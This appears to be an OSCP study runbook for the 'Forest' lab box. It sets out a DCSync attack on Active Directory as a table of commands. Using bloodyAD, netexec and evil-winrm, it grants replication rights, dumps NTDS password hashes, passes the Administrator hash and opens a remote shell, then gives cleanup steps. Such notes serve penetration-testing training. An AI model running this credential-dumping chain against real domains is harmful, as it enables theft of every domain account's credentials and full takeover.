---
tags: [oscp, active-directory, dcsync, runbook]
box_sources: [Forest]
---

# AD - DCSync

*Grant replication rights to a controlled account, extract NTDS hashes, and validate a privileged hash without cracking it.*

| Command                                                                                     | Evidence                                 | Works when                                                    | Notes                                                                           | ✅ Go to                         | ❌ If nothing works             |
| ------------------------------------------------------------------------------------------- | ---------------------------------------- | ------------------------------------------------------------- | ------------------------------------------------------------------------------- | ------------------------------- | ------------------------------ |
| `bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2` | bloodyAD confirms the account can DCSync | The refreshed account has WriteDACL through a delegated group | Run as the controlled account after group membership refresh                    | Dump NTDS                       | [[AD - ACL Enumeration]]       |
| `netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds`                          | Domain hashes are saved locally          | The account has DCSync rights                                 | Use this when secretsdump returns `ERROR_DS_DRA_BAD_DN` or another client error | Pass the hash                   | [[AD - Credential Validation]] |
| `netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain`                                 | Domain authentication succeeds           | `$NTHash` belongs to the target account                       | Do not use `--local-auth` against a domain controller                           | [[AD - Pass the Hash]]          | [[AD - Credential Validation]] |
| `evil-winrm -i $BoxIP -u Administrator -H $NTHash`                                          | Administrator shell opens                | WinRM is enabled and the hash is valid                        | Confirm identity and flag path without printing the flag                        | [[Post-Exploitation - Windows]] | [[AD - Credential Validation]] |

## Cleanup

```bash
bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP remove dcsync $Username2
```

```cmd
net user $Username2 /delete /domain
```

## Module Links

[[23. Attacking Active Directory Authentication]]
[[24. Lateral Movement in Active Directory]]

## External Resources

- [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
